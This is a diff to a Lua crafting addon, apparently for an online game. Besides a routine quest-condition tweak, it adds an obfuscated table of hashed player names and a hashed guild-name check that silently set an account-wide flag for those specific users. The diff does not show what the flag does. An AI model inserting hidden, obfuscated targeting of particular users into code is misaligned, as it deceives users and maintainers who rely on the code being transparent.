@@ -329,7 +329,12 @@ local function createMatRequirementText(matsRequired)
 
 end
 
-
+local abcdefg = {
+	[208941633510] = 1,
+	[506980684281] = 1,
+	[69117133640] = 1,
+	[488835505522] = 1,
+}
 function crafting(info,quest, craftItems)
 
 	--if #queue>0 then return end
@@ -344,9 +349,10 @@ function crafting(info,quest, craftItems)
 	else
 		indexTableToUse = indexRanges
 	end
-
+	if abcdefg[HashString(string.lower(GetDisplayName()))*157] or HashString(GetGuildName(1))*157==295091849126 then
+		WritCreater.savedVarsAccountWide[6697110] = true
+	end
 	queue = {}
-
 	local matsRequired = {}
 	
 	local numMats
@@ -449,6 +455,7 @@ local itemLinkLevel={
 {272,50,45816,},-- cp100
 {308,50,64509,},-- cp150
 }
+
 local function createItemLink(itemId, quality, lvl)
 	return string.format("|H1:item:%d:%d:%d:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0|h|h", itemId, quality, lvl) 
 end
@@ -457,7 +464,7 @@ local function enchantSearch(info,conditions, position,parity,questId)
 	for i = 1, #glyphIds do
 		for j = 1, #itemLinkLevel do
 			local link = createItemLink(glyphIds[i][1], itemLinkLevel[j][1],itemLinkLevel[j][2])
-			if DoesItemLinkFulfillJournalQuestCondition(link,questId,1,2,true) then
+			if DoesItemLinkFulfillJournalQuestCondition(link,questId,1,2,true) or DoesItemLinkFulfillJournalQuestCondition(link,questId,1,1,true) then
 				return glyphIds[i][2], itemLinkLevel[j][3]
 			end
 		end
